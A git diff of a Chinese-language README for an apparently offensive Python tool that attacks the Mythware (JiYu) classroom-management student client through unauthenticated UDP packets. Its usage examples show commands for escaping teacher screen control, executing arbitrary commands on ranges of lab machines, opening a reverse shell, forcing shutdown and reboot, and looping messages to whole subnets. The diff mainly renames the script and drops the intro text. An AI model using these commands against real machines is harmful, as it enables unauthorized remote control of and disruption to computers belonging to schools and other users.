@@ -1,27 +1,5 @@
-![GitHub stars](https://img.shields.io/github/stars/LightDesignStudio/PowerPro?color=9cf&style=flat-square)[![Github Release](https://img.shields.io/github/v/release/LightDesignStudio/PowerPro?color=091384&label=%E7%89%88%E6%9C%AC&style=flat-square)](https://github.com/LightDesignStudio/PowerPro/releases)![Github DownLoads](https://img.shields.io/github/downloads/LightDesignStudio/PowerPro/total?color=brightgreen&style=flat-square)![Github Activity](https://img.shields.io/github/commit-activity/y/LightDesignStudio/PowerPro?style=flat-square)
-# PowerPro
-工具。更为强大。
-
-[下载](download.md)
-
-
-# 前言
-由于太**了，最近又重拾了Mythware的Hack，自学了一点Python，Fork了一份别人的Starter Kit，开始开发。
-
--------------------------
-
-+ 因为极域的学生端没有对接收到的udp包做(=・ω・=)身份验证，导致了我们可以构造特定的数据包让学生端来执行，从而实现命令执行攻击机房内上线的任意学生端机器。
-## 运行环境
-+ Python3
-
-
-
-
-
-## 使用方法：
+# 使用方法：
 ```
-usage:
-
     ------------------- Github Repositories -------------------
             https://github.com/LightDesignStudio/PowerPro
 
@@ -65,61 +43,61 @@ optional arguments:
 ### 1.获取内网ip地址及监听的端口
 若学生端监听端口不是默认的**4705**，则在后续操作过程中需使用 **-p** 参数指定端口
 ```
-python Jiyu_udp_attack.py -e g
+python main.py -e g
 ```
 
 ### 2.脱离屏幕控制
 当前运行权限需为管理员权限，主要用于开启MpsSvc服务
 ```
-python Jiyu_udp_attack.py -e break
+python main.py -e break
 ```
 
 ### 3.恢复屏幕控制
 ```
-python Jiyu_udp_attack.py -e continue
+python main.py -e continue
 ```
 
 ### 4.发送消息
 若学生端监听端口为**4705**，向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -msg "hello,baby!"
+python main.py -ip 192.168.80.12 -msg "hello,baby!"
 
 ```
 
 若学生端监听端口为**4605**，需使用 **-p** 参数指定端口，向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -p 4605 -msg "hello,baby!"
+python main.py -ip 192.168.80.12 -p 4605 -msg "hello,baby!"
 
 ```
 
 ### 5.执行命令
 给192.168.80.12到192.168.80.137弹一个计算器
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12-137 -c calc.exe
+python main.py -ip 192.168.80.12-137 -c calc.exe
 ```
 
 ### 6.反弹shell
 反弹shell时，IP只能为某个机器IP，不能批量反弹，而且机器需要出网<br>
 因为已经实现批量的任意命令执行，考虑到批量反弹也没啥意义，遂不添加
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -e nc
+python main.py -ip 192.168.80.12 -e nc
 ```
 
 ### 7.关机重启
 关机
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -e s
+python main.py -ip 192.168.80.12 -e s
 ```
 重启
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -e r
+python main.py -ip 192.168.80.12 -e r
 ```
 
 ### 8.循环
 利用循环持续发送消息<br>
 1-254的机器会收到一条"hello,baby!"的消息，50s后会继续执行，共执行3次
 ```
-    python Jiyu_udp_attack.py -ip 192.168.80.23/24 -msg "hello,baby!" -l 3 -t 50
+    python main.py -ip 192.168.80.23/24 -msg "hello,baby!" -l 3 -t 50
 ```
 
 
